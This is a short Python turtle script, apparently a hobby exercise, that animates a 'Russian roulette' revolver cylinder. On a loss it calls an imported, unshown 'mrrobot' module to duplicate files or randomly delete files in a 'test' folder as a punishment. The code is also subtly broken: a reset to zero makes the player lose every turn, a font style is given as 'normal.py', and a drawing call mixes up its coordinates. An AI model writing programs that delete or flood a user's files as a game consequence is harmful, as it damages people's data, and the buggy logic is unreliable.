# Adding animation for Russian roulette

# coding utf-8
# The Russian roulette

import turtle
# import tkSimpleDialog  #2.x Python
import random
import math

import mrrobot

PHI = 360 / 7
R = 50

def gotoxy(x, y):
    turtle.penup()
    turtle.goto(x, y)
    turtle.pendown()

def draw_circle(r, color):
    turtle.fillcolor(color)
    turtle.begin_fill()
    turtle.circle(r)
    turtle.end_fill()

turtle.speed(0) #accelerate moving of cursor

def draw_pistol(base_x, base_y):
    # main circle
    gotoxy(base_x, base_y)
    turtle.circle(80)
    # bead
    gotoxy(base_y, base_y+160)
    draw_circle(5, "red")
    # barrel
    for i in range(0, 7):  # paint a barrel
        phi_rad = PHI * i * math.pi / 180.0
        gotoxy(base_x+math.sin(phi_rad) * R, base_y+math.cos(phi_rad) * R + 60)
        draw_circle(22, "white")

def rotate_pistol(base_x, base_y, start):
    for i in range(start, random.randrange(7, 20)):  # random.randrange(7, 100)
        phi_rad = PHI * i * math.pi / 180.0
        gotoxy(base_x + math.sin(phi_rad) * R, base_y + math.cos(phi_rad) * R + 60)
        draw_circle(22, "brown")
        draw_circle(22, "white")

    gotoxy(base_x + math.sin(phi_rad) * R, base_y + math.cos(phi_rad) * R + 60)
    draw_circle(22, "brown")

    return i % 7


draw_pistol(100,100)

answer = ''
start = 0
while answer != "N":
    answer = turtle.textinput("Let's play!?", "Y/N")

    if answer == "Y":
        start = rotate_pistol(100, 100, start)
        start = 0
        if start == 0:
            gotoxy(-150, 250)
            turtle.write("You are failed!", font=("Arial", 18, "normal.py"))

            z = random.randrange(0, 3)
            if z == 0:
                mrrobot.duble_files('test')
            elif z == 1:
                mrrobot.random_delete('test')
            else:
                gotoxy(-100,-50)
                turtle.write("You are lucky!!!", font=("Arial", 18, "normal.py"))

    else:
        pass
